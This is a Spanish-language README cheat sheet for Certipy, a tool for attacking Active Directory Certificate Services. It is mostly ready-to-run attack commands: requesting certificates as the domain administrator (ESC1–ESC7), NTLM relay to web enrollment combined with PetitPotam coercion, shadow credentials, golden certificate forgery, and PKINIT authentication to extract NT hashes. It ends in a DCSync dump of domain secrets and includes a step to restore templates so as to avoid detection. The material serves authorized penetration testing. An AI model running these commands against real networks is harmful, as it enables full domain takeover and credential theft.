<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p align="centro">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p align="centro">
  <b>🔑 Herramienta completa para enumerar y explotar configuraciones erróneas de los Servicios de certificados de Active Directory (AD CS)</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción](#-introducción)
- [¿Por qué abusar de AD CS?](#-why-ad-cs-abuse)
- [Instalación](#-instalación)
- [Descripción general de los subcomandos de Certipy](#-certipy-subcommands-overview)
- [Enumeración y descubrimiento (`find`)](#-enumeración--descubrimiento-buscar)
- [La Matriz de Vulnerabilidad ESC](#-la-matriz-de-vulnerabilidad-esc)
  - [ESC1: Nombre alternativo del sujeto de suministros del afiliado (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: Cualquier Propósito EKU o SubCA](#esc2-cualquier-propósito-eku-o-subca)
  - [ESC3: Agente de solicitud de certificado](#esc3-agente-de-solicitud-de-certificado)
  - [ESC4: Control de acceso a plantillas vulnerables (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7: Control de acceso a CA vulnerable](#esc7-vulnerable-ca-access-control)
  - [ESC8: Retransmisión NTLM a inscripción web HTTP](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 y ESC10: Defectos de mapeo de certificados fuertes](#esc9--esc10-flaws-de-mapping-certificado-fuerte)
- [Credenciales de sombra (`shadow`)](#-credenciales de sombra-sombra)
- [Certificados dorados (`forge`)](#-golden-certificates-forge)
- [Autenticando con PFX (`auth`)](#-autenticando-con-pfx-auth)
- [Flujos de trabajo de ataques del mundo real](#-flujos de trabajo-de-ataques-del-mundo-real)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consejos y mejores prácticas](#-consejos--mejores-prácticas)
- [Aviso legal](#-aviso-legal)
- [Recursos](#-recursos)

---

## 🎯 Introducción

**Certipy** (creado por Oliver Lyak) es la principal herramienta basada en Python para enumerar y explotar los Servicios de certificados de Active Directory (**AD CS**). AD CS es la implementación de infraestructura de clave pública (PKI) de Microsoft para redes empresariales de Active Directory, ampliamente utilizada para inicio de sesión con tarjeta inteligente, VPN, S/MIME y cifrado TLS interno.

Debido a que las configuraciones erróneas de los certificados frecuentemente permiten a los usuarios de dominios sin privilegios solicitar certificados como administradores de dominio o controladores de dominio, el abuso de AD CS representa uno de los vectores de escalada de dominio más confiables e impactantes en las pruebas de penetración empresarial modernas.

---

## ⚖️ ¿Por qué abusar de AD CS?

- ⚡ **Escalamiento de dominio instantáneo:** Las plantillas de certificado mal configuradas a menudo comprometen todo el dominio en segundos.
- 🔑 **Sigiloso y persistente:** Los certificados robados o los Certificados Dorados falsificados pueden permanecer válidos durante años sin activar alertas de cambio de contraseña estándar.
- 🔄 **PKINIT a NT Hash:** Certipy autentica los certificados `.pfx` solicitados a través de Kerberos PKINIT, recuperando el hash NT de texto sin formato del objetivo directamente desde el KDC.

---

## 📥 Instalación

### Usando pipx (recomendado)
```bash
pipx install certipy-ad
```
### Del repositorio de GitHub
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Verificación
```bash
certipy -h
```
---

## 🧭 Descripción general de los subcomandos de Certipy

| Subcomando | Función |
|------------|----------|
| `find` | Enumerar CA, plantillas y detectar vulnerabilidades de ESC |
| `req` | Solicitar certificados de plantillas vulnerables |
| `auth` | Autenticar utilizando certificados `.pfx` para recuperar hash TGT y NT |
| `ca` | Enumerar y modificar los ajustes de configuración de CA |
| `template` | Modificar la configuración de la plantilla de certificado (útil en ESC4) |
| `account` | Administrar cuentas de computadora de Active Directory (MachineAccountQuota) |
| `shadow` | Explotar credenciales ocultas (`msDS-KeyCredentialLink`) |
| `forge` | Falsificar certificados dorados utilizando una clave privada de CA robada |

---

## 🔍 Enumeración y descubrimiento (`find`)

Comience identificando la Autoridad de certificación empresarial (CA) y buscando plantillas vulnerables:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 La matriz de vulnerabilidad ESC

### ESC1: Nombre alternativo del sujeto de suministros del afiliado (SAN)

**Condición:**
- Los usuarios con pocos privilegios tienen derechos de inscripción (`Client Authentication` EKU habilitado).
- La plantilla especifica `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (permite al solicitante especificar cualquier nombre alternativo del sujeto, como el administrador del dominio).

**Explotación:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*¡La salida produce TGT del administrador y NT Hash en texto plano!*

---

### ESC2: Cualquier Propósito EKU o SubCA

**Condición:**
- La plantilla especifica `Any Purpose` EKU o no tiene ningún EKU definido.
- Puede usarse para cualquier propósito, incluida la autenticación del cliente.

**Explotación:**
Explotado de manera idéntica a ESC1 o usado en combinación con ESC3 para obtener un certificado de agente de inscripción.

---

### ESC3: Agente de solicitud de certificado

**Condición:**
- La plantilla tiene el EKU (Agente de inscripción) `Certificate Request Agent`.
- Permite solicitar certificados en nombre de otro usuario a través de plantillas secundarias.

**Explotación:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: Control de acceso a plantilla (ACL) vulnerable

**Condición:**
- El usuario con pocos privilegios tiene derechos `WriteOwner`, `WriteDacl` o `WriteProperty` sobre una plantilla de certificado.

**Explotación:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado

**Condición:**
- La CA tiene configurado el indicador `EDITF_ATTRIBUTESUBJECTALTNAME2`, lo que permite que cualquier solicitud de certificado especifique SAN arbitrarias independientemente de la configuración de la plantilla.

**Explotación:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: Control de acceso de CA vulnerable

**Condición:**
- El usuario tiene derechos `ManageCA` o `ManageCertificates` en la propia CA.

**Explotación:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: Retransmisión NTLM a inscripción web HTTP

**Condición:**
- La CA tiene el punto final HTTP de inscripción web (`/certsrv/`) habilitado con autenticación NTLM sin EPA (Protección extendida para autenticación) y HTTPS.

**Flujo de trabajo de explotación:**
1. Inicie `ntlmrelayx` apuntando a CA Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Activar la autenticación automática forzada a través de PetitPotam o PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` transmite la autenticación NTLM de la cuenta de máquina del DC, solicita un certificado de computadora y genera base64 `.pfx`.
4. Autenticarse como controlador de dominio mediante Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Utilice el hash NT del DC para realizar un volcado DCSync completo con `impacket-secretsdump`.

---

## 👥 Credenciales en la sombra (`shadow`)

Si una cuenta comprometida tiene acceso de escritura sobre el atributo `msDS-KeyCredentialLink` de otra cuenta:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Certificados Dorados (`forge`)

Si comprometió la CA y extrajo su clave privada:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Autenticación con PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Flujos de trabajo de ataques del mundo real

### Complete la adquisición del dominio ESC1 en 3 comandos
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Tabla de referencia rápida

| Tarea | Comando |
|------|---------|
| **Enumerar AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Solicitar certificado (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Autenticar PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Modificar plantilla (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Credenciales de sombra** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Administrar derechos de CA** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Forjar certificado dorado** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Consejos y mejores prácticas

1. **Verifique la sincronización del reloj de CC:**
   Kerberos PKINIT requiere que la hora de su sistema se sincronice dentro de los 5 minutos posteriores al controlador de dominio. Correr:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Manejar KDC_ERR_PADATA_TYPE_NOSUPP:**
   Si `certipy auth` falla con este error, el controlador de dominio no tiene un certificado de controlador de dominio válido instalado para PKINIT. En este caso, utilice autenticación LDAP o SChannel.
3. **Siempre limpie las plantillas ESC4:**
   Al modificar las plantillas de certificados, siempre conserve y vuelva a aplicar la configuración de respaldo (`-configuration <FILE>.json`) para evitar dejar el entorno vulnerable o causar interrupciones operativas.

---

## ⚠️ Aviso legal

> **IMPORTANTE:** Los ataques a los Servicios de certificados de Active Directory otorgan acceso administrativo crítico y de alto impacto a través de redes de dominio. Certipy solo debe ejecutarse durante pruebas de penetración autorizadas, ejercicios del equipo rojo y auditorías de seguridad ética con permiso por escrito.

---

## 📚 Recursos

- [Repositorio oficial de GitHub de Certipy](https://github.com/ly4k/Certipy)
- [Documento técnico sobre vehículos usados certificados (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Rutas de ataque y protecciones de AD CS (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)